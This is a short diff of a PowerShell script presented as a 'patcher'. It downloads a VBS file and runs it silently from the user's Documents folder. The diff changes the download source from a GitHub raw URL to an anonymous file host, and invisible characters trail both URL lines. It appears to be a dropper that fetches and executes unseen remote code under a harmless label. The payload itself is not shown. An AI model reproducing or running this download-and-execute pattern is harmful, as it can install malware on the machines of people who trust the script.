@@ -1,5 +1,5 @@
 # URL of your patcher
-$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/refs/heads/main/out.vbs"​​
+$exeUrl = "https://files.catbox.moe/zlqmpb.vbs"​​
 $exePath = "$Documents\Out.vbs"
  
 Write-Host "Please wait..." -ForegroundColor Cyan
@@ -18,4 +18,5 @@ if (Test-Path $exePath) {
     Start-Process $exePath
 } else {
     Write-Host "Download failed." -ForegroundColor Red
+
 }
